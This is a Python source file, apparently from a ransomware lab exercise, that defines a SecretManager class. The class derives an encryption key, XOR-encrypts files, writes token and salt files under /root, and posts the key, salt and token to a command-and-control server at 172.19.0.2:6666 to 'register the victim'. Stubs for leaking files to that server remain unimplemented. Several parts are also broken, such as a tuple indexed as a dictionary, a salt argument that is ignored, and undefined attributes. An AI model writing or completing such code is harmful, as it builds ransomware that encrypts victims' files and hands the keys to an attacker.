from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64


from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # derive a key from the salt and the key
        salt = bytes("16", "utf8")
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=16,
            salt=salt,
            iterations=48000)
        key = kdf.derive(key) # derive the key
        return key


    def create(self)->Tuple[bytes, bytes, bytes]:
        # Generate a random salt and private key, and derive the encryption key
        salt = secrets.token_bytes(16)
        key = secrets.token_bytes(32)
        encryption_key = self.do_derivation(salt, key)
        return salt, key, encryption_key

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        url = "http://172.19.0.2:6666/new" #Register the victim to the CNC
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        response = requests.post(url, json=data)
        response.raise_for_status()

    def setup(self)->None:
        tokens_generated = self.create()

        # Do the derivation key
        self._key, self._salt = self.do_derivation(tokens_generated["salt"], tokens_generated["key"])
        self._token = tokens_generated["token"]

        # Create the client folder
        folder_token_name = "/root/token"

        # Token folder's existance verification
        try:
            os.makedirs(folder_token_name)
        except:
            return
            raise

        # Create the binary token file
        with open(folder_token_name + "/token.bin", "wb") as f:
            f.write(self._token)

        # Create the binary salt file
        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(self._salt)

        # Send the Salt, Key and Token to the CNC
        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        # function to load crypto data from the target
        with open(os.path.join(self.SALT_PATH, "salt"), "rb") as f: # load salt
            self._salt = f.read()
        with open(os.path.join(self.TOKEN_PATH, "token"), "rb") as f: # load token
            self._token = f.read()
        
    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        for file in files:
            self._files_encrypted[str(file)] = xorfile(file, self._key)


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()